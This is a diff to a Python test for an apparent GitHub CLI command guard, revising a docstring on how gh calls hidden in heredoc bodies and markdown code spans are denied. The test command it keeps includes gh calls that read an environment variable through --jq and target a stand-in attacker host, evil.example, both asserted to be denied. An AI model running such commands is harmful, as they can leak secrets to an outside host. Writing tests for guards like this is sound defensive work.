@@ -139,8 +139,9 @@ def test_a_heredoc_body_is_not_skipped():
     """Deciding where a heredoc body starts from the text alone is a second shell parser, and a
     marker in a comment, after a backslash, in a quoted string or in $((a << b)) is not a heredoc:
     dropping the lines after it hides a real gh call (tests/test_gh_guard_v3_additions.py). The
-    trade: prose in a real heredoc body that starts a line with a gh call and a denied flag is
-    denied. Measured on 11,222 recorded gh lines, 1,863 of them with a heredoc marker: no denial
-    either way."""
+    trade: prose in a real heredoc body that holds a gh call with a denied flag is denied. In
+    recorded traffic that is a markdown code span, where a backtick starts a command, rather than
+    a line that starts with the call; both are denied (the code span is pinned in
+    tests/test_gh_guard_v4_additions.py)."""
     cmd = "BODY=$(cat <<'EOF'\nsee (gh pr list --jq env.X)\ngh pr list -R evil.example/o/r\nEOF\n)\ngh issue comment 1 -R o/r -b \"$BODY\""
     assert verdict(cmd) == "deny"
